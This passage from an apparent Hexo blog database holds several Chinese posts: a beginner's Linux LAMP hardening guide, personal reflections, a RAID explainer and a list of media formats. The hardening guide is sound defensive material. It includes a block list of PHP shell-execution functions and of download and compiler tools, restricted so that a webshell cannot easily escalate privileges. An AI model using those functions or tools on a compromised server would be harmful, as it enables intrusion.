功能。</p><p>多个数据库应创建不同的用户。除去所有远程连接权限。有必要时，关闭连接端口3306。只是本地连接的话，监听完全没有必要。</p><p>如果有mysql的0day，远程溢出也不好使。</p><p>4.php安全</p><p>如果php安全模式对现有的php程序没有影响，请开始安全模式。</p><p>禁止php函数。例如：system,passthru,dl,exec,shell_exec,popen,phpinfo,proc_open,chmod,chown,chroot,dir,opendir,readdir,scandir。前面红色的，我认为是很重要的。就算拿到webshell提权也不好提，列出文件函数也要禁止，dl这个还是比较有趣的。</p><p>5.apache安全</p><p>apache程序的uid用户，禁止登陆。</p><p>禁止某些目录执行php程序。</p><p>php网页程序，这个安全就不好说了。上传，注入，跨站。网站路径最好 “奇异”一点，后台要保护好。</p><p>6.权限设置。</p><p>chmod 700 gcc g++ perl php make 禁止一些开发工具。防止写代码编译提权（提前得到shell）。</p><p>chmod 700 wget chmod&nbsp; rpm yum&nbsp; 。。 禁止一些下载工具和权限控制程序 ，防止上传 提权程序，加执行权限。提权。</p><p>chmod 700 ping ifconfig netstat ps 。。 禁止一下系统配置命令，和网络命令。</p><p>&nbsp;</p><p>&nbsp;</p><p>以上就我所总结的，没有很大的0day，服务器不会被占用的。防止拿到webshell，那就是php网站程序的问题了。</p><p>如有什么地方错误，请大家指正。我也是初学者。</p>","source":"_posts/对linux服务器的一些安全设置.md","raw":"title: 对linux服务器的一些安全设置\ncategories: [网络安全]\ntags: []\ndate: 2011-07-12 17:01:00\n---\n<p>本地服务器架构为LAMP的。以下设置多多少少会增加不多安全。</p><p>&nbsp;</p><p>1.账号安全</p><p>禁用不需要的用户和系统账号，或者shell设置为/sbin/nologin,宿主目录为/dev/null，权限放低。</p><p>密码不能设置简单，密码最好不要与自己的信息有关系，日期、名称、电话、网址。最好为一句话，好记，又不容易被社工。</p><p>2.服务安全</p><p>禁用不需要的服务，修改常用的服务端口（自己用的话）。</p><p>3.mysql安全</p><p>在php中不要使用root连接。新建一个用户，只需要给 “增删改查” 功能。</p><p>多个数据库应创建不同的用户。除去所有远程连接权限。有必要时，关闭连接端口3306。只是本地连接的话，监听完全没有必要。</p><p>如果有mysql的0day，远程溢出也不好使。</p><p>4.php安全</p><p>如果php安全模式对现有的php程序没有影响，请开始安全模式。</p><p>禁止php函数。例如：system,passthru,dl,exec,shell_exec,popen,phpinfo,proc_open,chmod,chown,chroot,dir,opendir,readdir,scandir。前面红色的，我认为是很重要的。就算拿到webshell提权也不好提，列出文件函数也要禁止，dl这个还是比较有趣的。</p><p>5.apache安全</p><p>apache程序的uid用户，禁止登陆。</p><p>禁止某些目录执行php程序。</p><p>php网页程序，这个安全就不好说了。上传，注入，跨站。网站路径最好 “奇异”一点，后台要保护好。</p><p>6.权限设置。</p><p>chmod 700 gcc g++ perl php make 禁止一些开发工具。防止写代码编译提权（提前得到shell）。</p><p>chmod 700 wget chmod&nbsp; rpm yum&nbsp; 。。 禁止一些下载工具和权限控制程序 ，防止上传 提权程序，加执行权限。提权。</p><p>chmod 700 ping ifconfig netstat ps 。。 禁止一下系统配置命令，和网络命令。</p><p>&nbsp;</p><p>&nbsp;</p><p>以上就我所总结的，没有很大的0day，服务器不会被占用的。防止拿到webshell，那就是php网站程序的问题了。</p><p>如有什么地方错误，请大家指正。我也是初学者。</p>","slug":"对linux服务器的一些安全设置","published":1,"updated":"2023-04-22T05:38:45.046Z","_id":"clgrjlxkv009j7opiard4giay","comments":1,"layout":"post","photos":[],"link":"","content":"<p>本地服务器架构为LAMP的。以下设置多多少少会增加不多安全。</p><p>&nbsp;</p><p>1.账号安全</p><p>禁用不需要的用户和系统账号，或者shell设置为/sbin/nologin,宿主目录为/dev/null，权限放低。</p><p>密码不能设置简单，密码最好不要与自己的信息有关系，日期、名称、电话、网址。最好为一句话，好记，又不容易被社工。</p><p>2.服务安全</p><p>禁用不需要的服务，修改常用的服务端口（自己用的话）。</p><p>3.mysql安全</p><p>在php中不要使用root连接。新建一个用户，只需要给 “增删改查” 功能。</p><p>多个数据库应创建不同的用户。除去所有远程连接权限。有必要时，关闭连接端口3306。只是本地连接的话，监听完全没有必要。</p><p>如果有mysql的0day，远程溢出也不好使。</p><p>4.php安全</p><p>如果php安全模式对现有的php程序没有影响，请开始安全模式。</p><p>禁止php函数。例如：system,passthru,dl,exec,shell_exec,popen,phpinfo,proc_open,chmod,chown,chroot,dir,opendir,readdir,scandir。前面红色的，我认为是很重要的。就算拿到webshell提权也不好提，列出文件函数也要禁止，dl这个还是比较有趣的。</p><p>5.apache安全</p><p>apache程序的uid用户，禁止登陆。</p><p>禁止某些目录执行php程序。</p><p>php网页程序，这个安全就不好说了。上传，注入，跨站。网站路径最好 “奇异”一点，后台要保护好。</p><p>6.权限设置。</p><p>chmod 700 gcc g++ perl php make 禁止一些开发工具。防止写代码编译提权（提前得到shell）。</p><p>chmod 700 wget chmod&nbsp; rpm yum&nbsp; 。。 禁止一些下载工具和权限控制程序 ，防止上传 提权程序，加执行权限。提权。</p><p>chmod 700 ping ifconfig netstat ps 。。 禁止一下系统配置命令，和网络命令。</p><p>&nbsp;</p><p>&nbsp;</p><p>以上就我所总结的，没有很大的0day，服务器不会被占用的。防止拿到webshell，那就是php网站程序的问题了。</p><p>如有什么地方错误，请大家指正。我也是初学者。</p>","site":{"data":{}},"excerpt":"","more":"<p>本地服务器架构为LAMP的。以下设置多多少少会增加不多安全。</p><p>&nbsp;</p><p>1.账号安全</p><p>禁用不需要的用户和系统账号，或者shell设置为/sbin/nologin,宿主目录为/dev/null，权限放低。</p><p>密码不能设置简单，密码最好不要与自己的信息有关系，日期、名称、电话、网址。最好为一句话，好记，又不容易被社工。</p><p>2.服务安全</p><p>禁用不需要的服务，修改常用的服务端口（自己用的话）。</p><p>3.mysql安全</p><p>在php中不要使用root连接。新建一个用户，只需要给 “增删改查” 功能。</p><p>多个数据库应创建不同的用户。除去所有远程连接权限。有必要时，关闭连接端口3306。只是本地连接的话，监听完全没有必要。</p><p>如果有mysql的0day，远程溢出也不好使。</p><p>4.php安全</p><p>如果php安全模式对现有的php程序没有影响，请开始安全模式。</p><p>禁止php函数。例如：system,passthru,dl,exec,shell_exec,popen,phpinfo,proc_open,chmod,chown,chroot,dir,opendir,readdir,scandir。前面红色的，我认为是很重要的。就算拿到webshell提权也不好提，列出文件函数也要禁止，dl这个还是比较有趣的。</p><p>5.apache安全</p><p>apache程序的uid用户，禁止登陆。</p><p>禁止某些目录执行php程序。</p><p>php网页程序，这个安全就不好说了。上传，注入，跨站。网站路径最好 “奇异”一点，后台要保护好。</p><p>6.权限设置。</p><p>chmod 700 gcc g++ perl php make 禁止一些开发工具。防止写代码编译提权（提前得到shell）。</p><p>chmod 700 wget chmod&nbsp; rpm yum&nbsp; 。。 禁止一些下载工具和权限控制程序 ，防止上传 提权程序，加执行权限。提权。</p><p>chmod 700 ping ifconfig netstat ps 。。 禁止一下系统配置命令，和网络命令。</p><p>&nbsp;</p><p>&nbsp;</p><p>以上就我所总结的，没有很大的0day，服务器不会被占用的。防止拿到webshell，那就是php网站程序的问题了。</p><p>如有什么地方错误，请大家指正。我也是初学者。</p>"},{"title":"好好学习一个编程","date":"2010-10-03T11:48:00.000Z","_content":"以后要好好学习一下编程，思量也好，语言也好。<br />不想半途而废啊，学好了，做什么也有用哦。<br />有事的时候写写程序，学学习，<br />没事的时候构思个美女，写出来，给兄弟几个乐呵乐呵。<br />加油！！！<br />嘿嘿","source":"_posts/好好学习一个编程.md","raw":"title: 好好学习一个编程\ncategories: [程序设计]\ntags: []\ndate: 2010-10-03 19:48:00\n---\n以后要好好学习一下编程，思量也好，语言也好。<br />不想半途而废啊，学好了，做什么也有用哦。<br />有事的时候写写程序，学学习，<br />没事的时候构思个美女，写出来，给兄弟几个乐呵乐呵。<br />加油！！！<br />嘿嘿","slug":"好好学习一个编程","published":1,"updated":"2023-04-22T05:38:45.020Z","_id":"clgrjlxkw009m7opi2z7ufqir","comments":1,"layout":"post","photos":[],"link":"","content":"<p>以后要好好学习一下编程，思量也好，语言也好。<br />不想半途而废啊，学好了，做什么也有用哦。<br />有事的时候写写程序，学学习，<br />没事的时候构思个美女，写出来，给兄弟几个乐呵乐呵。<br />加油！！！<br />嘿嘿</p>\n","site":{"data":{}},"excerpt":"","more":"<p>以后要好好学习一下编程，思量也好，语言也好。<br />不想半途而废啊，学好了，做什么也有用哦。<br />有事的时候写写程序，学学习，<br />没事的时候构思个美女，写出来，给兄弟几个乐呵乐呵。<br />加油！！！<br />嘿嘿</p>\n"},{"title":"很无奈","date":"2010-04-03T20:24:00.000Z","_content":"走在路上看着别人开的车，别人住的房，心里很低落。。<br />相信在不久的将来自己也会这样的，面包会有的，住房会有的，车也会有的。<br />感情上的事，真的是没有心思再搞它了，先放一边。<br />男人主要以事业为重，再说没有稳定的物质要求，谁会跟你玩，笑话。<br />引用别人的一句话，“我奋斗了18年才能有资格和你坐在一起喝咖啡”。<br />现实中很多事很无奈、还有些事不是努力就能得到的。<br />而我自己的性子，就是只要我付出了，必须有回报或者是收获。<br />接二连三的没有得到什么，那会使我不想再对它再努力。<br />渐渐的就会忘记，渐渐的就会疲惫、","source":"_posts/很无奈.md","raw":"title: 很无奈\ncategories: [生活感想]\ntags: []\ndate: 2010-04-04 04:24:00\n---\n走在路上看着别人开的车，别人住的房，心里很低落。。<br />相信在不久的将来自己也会这样的，面包会有的，住房会有的，车也会有的。<br />感情上的事，真的是没有心思再搞它了，先放一边。<br />男人主要以事业为重，再说没有稳定的物质要求，谁会跟你玩，笑话。<br />引用别人的一句话，“我奋斗了18年才能有资格和你坐在一起喝咖啡”。<br />现实中很多事很无奈、还有些事不是努力就能得到的。<br />而我自己的性子，就是只要我付出了，必须有回报或者是收获。<br />接二连三的没有得到什么，那会使我不想再对它再努力。<br />渐渐的就会忘记，渐渐的就会疲惫、","slug":"很无奈","published":1,"updated":"2023-04-22T05:38:45.056Z","_id":"clgrjlxkx009o7opi9t80c2rr","comments":1,"layout":"post","photos":[],"link":"","content":"<p>走在路上看着别人开的车，别人住的房，心里很低落。。<br />相信在不久的将来自己也会这样的，面包会有的，住房会有的，车也会有的。<br />感情上的事，真的是没有心思再搞它了，先放一边。<br />男人主要以事业为重，再说没有稳定的物质要求，谁会跟你玩，笑话。<br />引用别人的一句话，“我奋斗了18年才能有资格和你坐在一起喝咖啡”。<br />现实中很多事很无奈、还有些事不是努力就能得到的。<br />而我自己的性子，就是只要我付出了，必须有回报或者是收获。<br />接二连三的没有得到什么，那会使我不想再对它再努力。<br />渐渐的就会忘记，渐渐的就会疲惫、</p>\n","site":{"data":{}},"excerpt":"","more":"<p>走在路上看着别人开的车，别人住的房，心里很低落。。<br />相信在不久的将来自己也会这样的，面包会有的，住房会有的，车也会有的。<br />感情上的事，真的是没有心思再搞它了，先放一边。<br />男人主要以事业为重，再说没有稳定的物质要求，谁会跟你玩，笑话。<br />引用别人的一句话，“我奋斗了18年才能有资格和你坐在一起喝咖啡”。<br />现实中很多事很无奈、还有些事不是努力就能得到的。<br />而我自己的性子，就是只要我付出了，必须有回报或者是收获。<br />接二连三的没有得到什么，那会使我不想再对它再努力。<br />渐渐的就会忘记，渐渐的就会疲惫、</p>\n"},{"title":"浮躁的天，浮躁的我。","date":"2011-05-21T04:53:00.000Z","_content":"<p>&nbsp; 看了几位大牛的blog，发现自己太浮躁的了，太没有耐心了。想到什么做什么，没有一点计划性。但往往计划了，却不去坚持。</p><p>记得，高中读狼图腾的时候，发现狼为了，捕捉猎物。会一动不动，等待几个小时。一旦时机成熟，立马去行动。狼一直是我崇拜的偶像，</p><p>耐性要改一改了。如果人重复去做单一的事情，他就不是很简单，而我现在做不到。工作终于辞职下来了，看了看网上的招聘信息。linux方面，真的很少的。也许不是一个招聘的季节，也许不是一个做技术的城市。迷茫中、换工作，还是转城市。还是、、、、</p><p>&nbsp;</p><p></p>","source":"_posts/浮躁的天，浮躁的我。.md","raw":"title: 浮躁的天，浮躁的我。\ncategories: [生活感想]\ntags: []\ndate: 2011-05-21 12:53:00\n---\n<p>&nbsp; 看了几位大牛的blog，发现自己太浮躁的了，太没有耐心了。想到什么做什么，没有一点计划性。但往往计划了，却不去坚持。</p><p>记得，高中读狼图腾的时候，发现狼为了，捕捉猎物。会一动不动，等待几个小时。一旦时机成熟，立马去行动。狼一直是我崇拜的偶像，</p><p>耐性要改一改了。如果人重复去做单一的事情，他就不是很简单，而我现在做不到。工作终于辞职下来了，看了看网上的招聘信息。linux方面，真的很少的。也许不是一个招聘的季节，也许不是一个做技术的城市。迷茫中、换工作，还是转城市。还是、、、、</p><p>&nbsp;</p><p></p>","slug":"浮躁的天，浮躁的我。","published":1,"updated":"2023-04-22T05:38:45.095Z","_id":"clgrjlxky009q7opi0r0l8x1c","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&nbsp; 看了几位大牛的blog，发现自己太浮躁的了，太没有耐心了。想到什么做什么，没有一点计划性。但往往计划了，却不去坚持。</p><p>记得，高中读狼图腾的时候，发现狼为了，捕捉猎物。会一动不动，等待几个小时。一旦时机成熟，立马去行动。狼一直是我崇拜的偶像，</p><p>耐性要改一改了。如果人重复去做单一的事情，他就不是很简单，而我现在做不到。工作终于辞职下来了，看了看网上的招聘信息。linux方面，真的很少的。也许不是一个招聘的季节，也许不是一个做技术的城市。迷茫中、换工作，还是转城市。还是、、、、</p><p>&nbsp;</p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>&nbsp; 看了几位大牛的blog，发现自己太浮躁的了，太没有耐心了。想到什么做什么，没有一点计划性。但往往计划了，却不去坚持。</p><p>记得，高中读狼图腾的时候，发现狼为了，捕捉猎物。会一动不动，等待几个小时。一旦时机成熟，立马去行动。狼一直是我崇拜的偶像，</p><p>耐性要改一改了。如果人重复去做单一的事情，他就不是很简单，而我现在做不到。工作终于辞职下来了，看了看网上的招聘信息。linux方面，真的很少的。也许不是一个招聘的季节，也许不是一个做技术的城市。迷茫中、换工作，还是转城市。还是、、、、</p><p>&nbsp;</p><p></p>"},{"title":"磁盘阵列的做法","date":"2010-06-10T14:28:00.000Z","_content":"RAID，为Redundant Arrays of Independent Disks的简称，中文为廉价冗余磁盘阵列。 <br /><br />磁盘阵列 其实也分为软阵列 (Software Raid)和硬阵列 (Hardware Raid) 两种.  软阵列即通过软件程序并由计算机的CPU提供运行能力所成. 由于软件程式不是一个完整系统故只能提供最基本的 RAID容错功能.  其他如热备用硬盘的设置, <br />远程管理等功能均一一欠奉. 硬阵列是由独立操作的硬件提供整个磁盘阵列的控制和计算功能.  不依靠系统的CPU资源. <br />由于硬阵列是一个完整的系统, 所有需要的功能均可以做进去. 所以硬阵列所提供的功能和性能均比软阵列好. 而且,  <br />如果你想把系统也做到磁盘阵列中, 硬阵列是唯一的选择. 故我们可以看市场上 RAID 5 级的磁盘阵列均为硬阵列. 软 <br />阵列只 适用于 Raid 0 和 Raid 1. 对于我们做镜像用的镜像塔, 肯定不会用 Raid 0或 Raid 1。 <br /><br /><br />作为高 性能的存储系统，巳经得到了越来越广泛的应用。RAID的级别从RAID概念的提出到现在，巳经发展了六个级别，其级别分别是0、1、2、3、4、5等。 但是最常用的是0、1、3、5四个级别。下面就介绍这四个级别。 <br /><br />RAID  0：将多个较小的磁盘合并成一个大的磁盘，不具有冗余，并行I/O，速度最快。RAID  0亦称为带区集。它是将多个磁盘并列起来，成为一个大硬盘。在存放数据时，其将数据按磁盘的个数来进行分段，然后同时将这些数据写进这些盘中。 <br />所 以，在所有的级别中，RAID 0的速度是最快的。但是RAID 0没有冗余功能的，如果一个磁盘（物理）损坏，则所有的数据都无法使用。 <br /><br />RAID  1：两组相同的磁盘系统互作镜像，速度没有提高，但是允许单个磁盘错，可靠性最高。RAID  1就是镜像。其原理为在主硬盘上存放数据的同时也在镜像硬盘上写一样的数据。当主硬盘（物理）损坏时，镜像硬盘则代替主硬盘的工作。因为有镜像硬盘做数据 备份，所以RAID 1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID上磁盘利用率最低的一个级别。  <br /><br />RAID Level 3 <br /><br /><br />RAID 3存放数据的原理和RAID0、RAID1不同。RAID  3是以一个硬盘来存放数据的奇偶校验位，数据则分段存储于其余硬盘中。它象RAID 0一样以并行的方式来存放数，但速度没有RAID  0快。如果数据盘（物理）损坏，只要将坏硬盘换掉，RAID <br />控制系统则会根据校验盘的数据校验位在新盘中重建坏盘上的数据。不过，如果校验盘 （物理）损坏的话，则全部数据都无法使用。利用单独的校验盘来保护数据虽然没有镜像的安全性高，但是硬盘利用率得到了很大的提高，为n-1。 <br /><br />RAID  5：向阵列中的磁盘写数据，奇偶校验数据存放在阵列中的各个盘上，允许单个磁盘出错。RAID  5也是以数据的校验位来保证数据的安全，但它不是以单独硬盘来存放数据的校验位，而是将数据段的校验位交互存放于各个硬盘上。这样，任何一个硬盘损坏，都 可以根据其它硬盘上的校验位来重建损坏的数据。硬盘的利用率为n-1。 <br /><br />RAID 0－1：同时具有RAID 0和RAID 1的优点。  <br /><br />冗余：采用多个设备同时工作，当其中一个设备失效时，其它设备能够接替失效设备继续工作的体系。在PC服务器上，通常在磁盘子系统、电 源子系统采用冗余技术。","source":"_posts/磁盘阵列的做法.md","raw":"title: 磁盘阵列的做法\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-06-10 22:28:00\n---\nRAID，为Redundant Arrays of Independent Disks的简称，中文为廉价冗余磁盘阵列。 <br /><br />磁盘阵列 其实也分为软阵列 (Software Raid)和硬阵列 (Hardware Raid) 两种.  软阵列即通过软件程序并由计算机的CPU提供运行能力所成. 由于软件程式不是一个完整系统故只能提供最基本的 RAID容错功能.  其他如热备用硬盘的设置, <br />远程管理等功能均一一欠奉. 硬阵列是由独立操作的硬件提供整个磁盘阵列的控制和计算功能.  不依靠系统的CPU资源. <br />由于硬阵列是一个完整的系统, 所有需要的功能均可以做进去. 所以硬阵列所提供的功能和性能均比软阵列好. 而且,  <br />如果你想把系统也做到磁盘阵列中, 硬阵列是唯一的选择. 故我们可以看市场上 RAID 5 级的磁盘阵列均为硬阵列. 软 <br />阵列只 适用于 Raid 0 和 Raid 1. 对于我们做镜像用的镜像塔, 肯定不会用 Raid 0或 Raid 1。 <br /><br /><br />作为高 性能的存储系统，巳经得到了越来越广泛的应用。RAID的级别从RAID概念的提出到现在，巳经发展了六个级别，其级别分别是0、1、2、3、4、5等。 但是最常用的是0、1、3、5四个级别。下面就介绍这四个级别。 <br /><br />RAID  0：将多个较小的磁盘合并成一个大的磁盘，不具有冗余，并行I/O，速度最快。RAID  0亦称为带区集。它是将多个磁盘并列起来，成为一个大硬盘。在存放数据时，其将数据按磁盘的个数来进行分段，然后同时将这些数据写进这些盘中。 <br />所 以，在所有的级别中，RAID 0的速度是最快的。但是RAID 0没有冗余功能的，如果一个磁盘（物理）损坏，则所有的数据都无法使用。 <br /><br />RAID  1：两组相同的磁盘系统互作镜像，速度没有提高，但是允许单个磁盘错，可靠性最高。RAID  1就是镜像。其原理为在主硬盘上存放数据的同时也在镜像硬盘上写一样的数据。当主硬盘（物理）损坏时，镜像硬盘则代替主硬盘的工作。因为有镜像硬盘做数据 备份，所以RAID 1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID上磁盘利用率最低的一个级别。  <br /><br />RAID Level 3 <br /><br /><br />RAID 3存放数据的原理和RAID0、RAID1不同。RAID  3是以一个硬盘来存放数据的奇偶校验位，数据则分段存储于其余硬盘中。它象RAID 0一样以并行的方式来存放数，但速度没有RAID  0快。如果数据盘（物理）损坏，只要将坏硬盘换掉，RAID <br />控制系统则会根据校验盘的数据校验位在新盘中重建坏盘上的数据。不过，如果校验盘 （物理）损坏的话，则全部数据都无法使用。利用单独的校验盘来保护数据虽然没有镜像的安全性高，但是硬盘利用率得到了很大的提高，为n-1。 <br /><br />RAID  5：向阵列中的磁盘写数据，奇偶校验数据存放在阵列中的各个盘上，允许单个磁盘出错。RAID  5也是以数据的校验位来保证数据的安全，但它不是以单独硬盘来存放数据的校验位，而是将数据段的校验位交互存放于各个硬盘上。这样，任何一个硬盘损坏，都 可以根据其它硬盘上的校验位来重建损坏的数据。硬盘的利用率为n-1。 <br /><br />RAID 0－1：同时具有RAID 0和RAID 1的优点。  <br /><br />冗余：采用多个设备同时工作，当其中一个设备失效时，其它设备能够接替失效设备继续工作的体系。在PC服务器上，通常在磁盘子系统、电 源子系统采用冗余技术。","slug":"磁盘阵列的做法","published":1,"updated":"2023-04-22T05:38:45.122Z","_id":"clgrjlxky009s7opi1z767ksb","comments":1,"layout":"post","photos":[],"link":"","content":"<p>RAID，为Redundant Arrays of Independent Disks的简称，中文为廉价冗余磁盘阵列。 <br /><br />磁盘阵列 其实也分为软阵列 (Software Raid)和硬阵列 (Hardware Raid) 两种.  软阵列即通过软件程序并由计算机的CPU提供运行能力所成. 由于软件程式不是一个完整系统故只能提供最基本的 RAID容错功能.  其他如热备用硬盘的设置, <br />远程管理等功能均一一欠奉. 硬阵列是由独立操作的硬件提供整个磁盘阵列的控制和计算功能.  不依靠系统的CPU资源. <br />由于硬阵列是一个完整的系统, 所有需要的功能均可以做进去. 所以硬阵列所提供的功能和性能均比软阵列好. 而且,  <br />如果你想把系统也做到磁盘阵列中, 硬阵列是唯一的选择. 故我们可以看市场上 RAID 5 级的磁盘阵列均为硬阵列. 软 <br />阵列只 适用于 Raid 0 和 Raid 1. 对于我们做镜像用的镜像塔, 肯定不会用 Raid 0或 Raid 1。 <br /><br /><br />作为高 性能的存储系统，巳经得到了越来越广泛的应用。RAID的级别从RAID概念的提出到现在，巳经发展了六个级别，其级别分别是0、1、2、3、4、5等。 但是最常用的是0、1、3、5四个级别。下面就介绍这四个级别。 <br /><br />RAID  0：将多个较小的磁盘合并成一个大的磁盘，不具有冗余，并行I&#x2F;O，速度最快。RAID  0亦称为带区集。它是将多个磁盘并列起来，成为一个大硬盘。在存放数据时，其将数据按磁盘的个数来进行分段，然后同时将这些数据写进这些盘中。 <br />所 以，在所有的级别中，RAID 0的速度是最快的。但是RAID 0没有冗余功能的，如果一个磁盘（物理）损坏，则所有的数据都无法使用。 <br /><br />RAID  1：两组相同的磁盘系统互作镜像，速度没有提高，但是允许单个磁盘错，可靠性最高。RAID  1就是镜像。其原理为在主硬盘上存放数据的同时也在镜像硬盘上写一样的数据。当主硬盘（物理）损坏时，镜像硬盘则代替主硬盘的工作。因为有镜像硬盘做数据 备份，所以RAID 1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID上磁盘利用率最低的一个级别。  <br /><br />RAID Level 3 <br /><br /><br />RAID 3存放数据的原理和RAID0、RAID1不同。RAID  3是以一个硬盘来存放数据的奇偶校验位，数据则分段存储于其余硬盘中。它象RAID 0一样以并行的方式来存放数，但速度没有RAID  0快。如果数据盘（物理）损坏，只要将坏硬盘换掉，RAID <br />控制系统则会根据校验盘的数据校验位在新盘中重建坏盘上的数据。不过，如果校验盘 （物理）损坏的话，则全部数据都无法使用。利用单独的校验盘来保护数据虽然没有镜像的安全性高，但是硬盘利用率得到了很大的提高，为n-1。 <br /><br />RAID  5：向阵列中的磁盘写数据，奇偶校验数据存放在阵列中的各个盘上，允许单个磁盘出错。RAID  5也是以数据的校验位来保证数据的安全，但它不是以单独硬盘来存放数据的校验位，而是将数据段的校验位交互存放于各个硬盘上。这样，任何一个硬盘损坏，都 可以根据其它硬盘上的校验位来重建损坏的数据。硬盘的利用率为n-1。 <br /><br />RAID 0－1：同时具有RAID 0和RAID 1的优点。  <br /><br />冗余：采用多个设备同时工作，当其中一个设备失效时，其它设备能够接替失效设备继续工作的体系。在PC服务器上，通常在磁盘子系统、电 源子系统采用冗余技术。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>RAID，为Redundant Arrays of Independent Disks的简称，中文为廉价冗余磁盘阵列。 <br /><br />磁盘阵列 其实也分为软阵列 (Software Raid)和硬阵列 (Hardware Raid) 两种.  软阵列即通过软件程序并由计算机的CPU提供运行能力所成. 由于软件程式不是一个完整系统故只能提供最基本的 RAID容错功能.  其他如热备用硬盘的设置, <br />远程管理等功能均一一欠奉. 硬阵列是由独立操作的硬件提供整个磁盘阵列的控制和计算功能.  不依靠系统的CPU资源. <br />由于硬阵列是一个完整的系统, 所有需要的功能均可以做进去. 所以硬阵列所提供的功能和性能均比软阵列好. 而且,  <br />如果你想把系统也做到磁盘阵列中, 硬阵列是唯一的选择. 故我们可以看市场上 RAID 5 级的磁盘阵列均为硬阵列. 软 <br />阵列只 适用于 Raid 0 和 Raid 1. 对于我们做镜像用的镜像塔, 肯定不会用 Raid 0或 Raid 1。 <br /><br /><br />作为高 性能的存储系统，巳经得到了越来越广泛的应用。RAID的级别从RAID概念的提出到现在，巳经发展了六个级别，其级别分别是0、1、2、3、4、5等。 但是最常用的是0、1、3、5四个级别。下面就介绍这四个级别。 <br /><br />RAID  0：将多个较小的磁盘合并成一个大的磁盘，不具有冗余，并行I&#x2F;O，速度最快。RAID  0亦称为带区集。它是将多个磁盘并列起来，成为一个大硬盘。在存放数据时，其将数据按磁盘的个数来进行分段，然后同时将这些数据写进这些盘中。 <br />所 以，在所有的级别中，RAID 0的速度是最快的。但是RAID 0没有冗余功能的，如果一个磁盘（物理）损坏，则所有的数据都无法使用。 <br /><br />RAID  1：两组相同的磁盘系统互作镜像，速度没有提高，但是允许单个磁盘错，可靠性最高。RAID  1就是镜像。其原理为在主硬盘上存放数据的同时也在镜像硬盘上写一样的数据。当主硬盘（物理）损坏时，镜像硬盘则代替主硬盘的工作。因为有镜像硬盘做数据 备份，所以RAID 1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID上磁盘利用率最低的一个级别。  <br /><br />RAID Level 3 <br /><br /><br />RAID 3存放数据的原理和RAID0、RAID1不同。RAID  3是以一个硬盘来存放数据的奇偶校验位，数据则分段存储于其余硬盘中。它象RAID 0一样以并行的方式来存放数，但速度没有RAID  0快。如果数据盘（物理）损坏，只要将坏硬盘换掉，RAID <br />控制系统则会根据校验盘的数据校验位在新盘中重建坏盘上的数据。不过，如果校验盘 （物理）损坏的话，则全部数据都无法使用。利用单独的校验盘来保护数据虽然没有镜像的安全性高，但是硬盘利用率得到了很大的提高，为n-1。 <br /><br />RAID  5：向阵列中的磁盘写数据，奇偶校验数据存放在阵列中的各个盘上，允许单个磁盘出错。RAID  5也是以数据的校验位来保证数据的安全，但它不是以单独硬盘来存放数据的校验位，而是将数据段的校验位交互存放于各个硬盘上。这样，任何一个硬盘损坏，都 可以根据其它硬盘上的校验位来重建损坏的数据。硬盘的利用率为n-1。 <br /><br />RAID 0－1：同时具有RAID 0和RAID 1的优点。  <br /><br />冗余：采用多个设备同时工作，当其中一个设备失效时，其它设备能够接替失效设备继续工作的体系。在PC服务器上，通常在磁盘子系统、电 源子系统采用冗余技术。</p>\n"},{"title":"很NB的一个自我介绍","date":"2010-03-26T08:01:00.000Z","_content":"<img src=\"/images/pic/0cedc91f66999abd86d6b668.jpg\" small=\"0\" /><br />","source":"_posts/很NB的一个自我介绍.md","raw":"title: 很NB的一个自我介绍\ncategories: [Windows]\ntags: []\ndate: 2010-03-26 16:01:00\n---\n<img src=\"/images/pic/0cedc91f66999abd86d6b668.jpg\" small=\"0\" /><br />","slug":"很NB的一个自我介绍","published":1,"updated":"2023-04-22T05:38:45.054Z","_id":"clgrjlxkz009u7opi9ds262dh","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"/images/pic/0cedc91f66999abd86d6b668.jpg\" small=\"0\" /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/images/pic/0cedc91f66999abd86d6b668.jpg\" small=\"0\" /><br /></p>\n"},{"title":"常见多媒体素材的格式和特点","date":"2010-04-21T03:06:00.000Z","_content":"<p>常见多媒体素材的格式和特点</p><p>（一）图片</p><p>　　　　　几种常见的图片存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>BMP</p> <p>无压缩，不会丢失图像的任何细节，但是占用的存储空间大</p> <p>JPG（JPEG）</p> <p>一种常用的压缩格式，占用的存储空间小</p> <p>GIF</p> <p>颜色的失真度较大，有动态和静态两种</p> <p>WMF</p> <p>微软公司自定的矢量图格式，OFFICE剪辑 库中的图形就是以这种格式保存的</p> <p>　　　　　常用的图形软件有：ACDSee、PhotoShop等。</p><p>（二） 声音</p><p>　　　几种常见的声音存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>WAV</p> <p>无压缩，音质最好，但占用的存储空间大</p> <p>MIDI</p> <p>电脑音乐的统称，占用的存储空间很小</p> <p>MP3</p> <p>将WAV压缩后的一种音乐格式，占用空间小， 声音质量高</p> <p>WMA</p> <p>微 软公司的一种声音格式，占用空间比MP3小，且声音质量很高</p> <p>　　常用的播放声音的软件有：Windows Media  Player、Winamp、豪杰超级解霸等</p><p>（三）视频和动画</p><p>　　　　几种常见的视频和动画的存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>AVI</p> <p>由视频和音频两部分组成，无压缩，高质量，但占用存储空间大</p> <p>RM</p> <p>质量不高，占用空间小，一般用于低速网上实时传 输音频和视频信息的压缩格式</p> <p>DAT</p> <p>VCD影碟中的视频文件</p> <p>SWF</p> <p>Flash动画，占用的空间小</p> <p>　　常用的视频播放软件有：豪杰超级解霸、Realone Player、Windows  Media Player、Flash Player等</p>","source":"_posts/常见多媒体素材的格式和特点.md","raw":"title: 常见多媒体素材的格式和特点\ncategories: [Windows]\ntags: []\ndate: 2010-04-21 11:06:00\n---\n<p>常见多媒体素材的格式和特点</p><p>（一）图片</p><p>　　　　　几种常见的图片存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> 